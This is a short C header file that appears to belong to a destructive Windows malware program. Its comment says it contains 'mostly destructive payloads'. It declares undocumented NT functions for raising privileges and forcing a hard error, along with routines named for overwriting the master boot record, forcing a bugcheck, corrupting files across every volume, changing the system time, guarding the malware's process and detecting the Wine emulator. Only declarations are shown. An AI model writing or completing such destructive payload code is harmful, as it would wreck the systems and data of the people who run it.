#pragma once
//Project headers
#include "main.h"

//This file contains mostly destructive payloads (with some exceptions)

typedef LPCSTR (NTAPI *_wine_get_version) (VOID);

typedef NTSTATUS (NTAPI *_RtlAdjustPrivilege)
(
	_In_ INT    Privilege,
	_In_ BOOLEAN  Enable,
	_In_ BOOLEAN  CurrentThread,
	_In_reads_to_ptr_(Enabled) PBOOLEAN Enabled
);

typedef ULONG (NTAPI *_RtlRandom) (
  _Inout_ PULONG puSeed
);

typedef NTSTATUS (NTAPI *_NtRaiseHardError)
(
	_In_ NTSTATUS ErrorStatus,
	_In_ ULONG NumberOfParameters,
	_In_ ULONG UnicodeStringParameterMask,
	_In_ PULONG_PTR Parameters,
	_In_ ULONG ValidResponseOptions,
	_Out_writes_to_ptr_(Respons) PULONG Respons
);

VOID WINAPI fnChangeMBR(VOID);
VOID WINAPI fnProcessWatchdog(VOID);
VOID WINAPI fnCauseBugcheck(VOID);
BOOL WINAPI fnCheckWine(VOID);
VOID WINAPI fnSetRandomTime(VOID);

VOID WINAPI fnFindVolumes(VOID);
VOID WINAPI fnFileCorruptor(LPCWSTR lpszVolumeArg);
ULONG WINAPI fnRNG(VOID);

//Defines
#define SE_SHUTDOWN_PRIVILEGE 19